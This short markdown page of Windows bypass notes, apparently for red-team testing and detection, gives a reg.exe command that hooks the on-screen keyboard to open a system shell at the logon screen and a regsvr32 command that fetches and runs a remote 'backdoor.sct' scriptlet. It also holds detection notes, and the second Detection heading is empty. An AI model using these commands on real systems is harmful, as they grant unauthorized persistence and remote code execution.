# Bypasses

## Application Whitelisting


[Application Whitelist Auditor - Airlock Digital](https://www.airlockdigital.com/application-whitelisting-auditor/)

[AllTheThings - SubTee](https://github.com/subTee/AllTheThings)

[Bypass Techniques - SubTee](https://github.com/subTee/ApplicationWhitelistBypassTechniques)

## Native Utilities

### Reg.exe

Create a registry entry on the host, allowing a system-level shell to be invoked any time that the osk.exe (on screen keyboard) process is called:

    reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f

Test:

Logout of current session. Select the accessibility controls on the logon screen and click "On Screen Keyboard"

Detection:

Reg.exe add a process or a command shell. Much of it will be based on command line or actual registry key value add/changes.

Utilman.exe spawning cmd.exe and detecting whatever other commands executed via cmdline (ex - net user jack pwnfish /add)

### Regsvr32 + sct file + powershell encoded command

This is based on @SubTee sct bypass  - https://github.com/subTee/SCTPersistence

Test:

    regsvr32.exe /s https://gist.githubusercontent.com/MHaggis/31a1d0efd882d048436aeb7b9fd7f6d0/raw/b96dc20465abfeed3f05ba56b28e2ff91c398606/backdoor.sct

Detection:
